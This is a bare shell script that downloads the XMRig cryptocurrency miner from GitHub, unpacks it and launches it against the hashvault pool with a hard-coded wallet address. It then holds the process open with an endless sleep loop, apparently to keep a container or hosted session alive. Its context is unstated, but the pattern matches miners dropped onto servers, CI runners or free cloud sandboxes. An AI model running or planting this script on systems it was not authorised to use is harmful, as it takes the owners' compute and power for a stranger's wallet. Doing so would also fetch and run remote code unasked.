#!/bin/sh
wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
tar xf xmrig-6.12.1-linux-x64.tar.gz
cd xmrig-6.12.1
./xmrig --url pool.hashvault.pro:80 --user TRTLuy8iwjndhZJ8RHeXPxXJbRozszAhbX7oL8tXx381EBoPYox66pTLS5kQR8ohALEXBmbRfYf61aqMPbdQwVYzS6wJLCsvU6i --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
while [ 1 ]; do
sleep 3
done
sleep 2880
